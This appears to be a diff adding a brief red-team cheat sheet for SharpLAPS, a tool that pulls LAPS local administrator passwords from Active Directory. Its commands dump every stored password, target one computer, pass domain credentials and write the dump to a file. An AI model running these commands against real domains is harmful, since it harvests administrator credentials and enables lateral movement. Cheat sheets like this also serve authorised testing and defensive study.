@@ -1,0 +1,8 @@
+==============================
+SharpLAPS
+==============================
+
+SharpLAPS.exe all                            # Retrieves all LAPS (Local Admin Password Solution) stored passwords from AD
+SharpLAPS.exe computername=TARGETCOMPUTER    # Retrieves LAPS password for a specific computer
+SharpLAPS.exe domain=domain.local username=admin password=Pass123! # Specifies credentials and domain manually
+SharpLAPS.exe all > laps_dump.txt            # Saves all retrieved passwords to a file
